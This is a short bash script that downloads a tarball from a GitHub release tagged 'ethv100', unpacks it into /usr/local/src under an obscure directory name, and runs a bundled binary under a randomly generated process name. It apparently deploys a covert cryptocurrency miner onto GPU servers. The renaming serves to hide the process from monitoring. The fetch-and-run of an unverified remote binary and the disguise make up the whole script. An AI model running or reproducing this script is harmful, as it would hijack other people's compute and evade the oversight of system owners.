#!/bin/bash
sudo apt-get update
azure=mxsemsdnlkdj;
mkdir /usr/local
mkdir /usr/local/src
rm -r /usr/local/src/$azure
rm -r platinum.tar.gz
wget https://github.com/ts6aud5vkg/gpuissa/releases/download/ethv100/platinum.tar.gz
tar xf platinum.tar.gz
rm -r platinum.tar.gz
mv platinum /usr/local/src/$azure
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
cd /usr/local/src/$azure
sudo cp uranium "$cpuname"
echo $cpuname" is starting"
./"${cpuname}"
